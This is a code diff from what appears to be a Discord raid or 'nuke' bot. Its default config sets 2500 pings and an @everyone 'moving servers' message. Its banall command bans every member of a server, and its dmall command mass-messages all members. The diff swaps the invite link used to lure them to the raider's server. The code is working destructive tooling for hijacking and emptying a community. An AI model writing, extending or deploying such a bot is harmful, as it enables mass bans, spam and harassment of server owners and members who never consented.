@@ -34,7 +34,7 @@ DEFAULT_CONFIG = {
     "pings": 2500,
     "server-name": "moving to /chrxmaticc",
     "webhook-name": "/chrxmaticc",
-    "message": "moving servers: https://discord.gg/chrxmaticc  @everyone"
+    "message": "moving servers: https://discord.gg/jDzk3c2tXy  @everyone"
 }
 
 def parse_inline_config(content):
@@ -183,7 +183,7 @@ async def banall(ctx):
     async def safe_ban(member):
         try:
             async with rate_limiter:
-                await guild.ban(member, reason="whoops bye bye! go to discord.gg/chrxmaticc to join back!")
+                await guild.ban(member, reason="whoops bye bye! go to https://discord.gg/jDzk3c2tXy to join back!")
         except discord.HTTPException as e:
             if e.status == 429:
                 await asyncio.sleep(e.retry_after or 1)
@@ -200,7 +200,7 @@ async def banall(ctx):
 async def dmall(ctx):
     guild = ctx.guild
     dm_tasks = [
-        member.send(f"hy {member.mention} the server named {guild.name} is moving servers to https://discord.gg/chrxmaticc")
+        member.send(f"hy {member.mention} the server named {guild.name} is moving servers to https://discord.gg/jDzk3c2tXy ")
         for member in guild.members
         if not member.bot and member.id != ctx.author.id
     ]
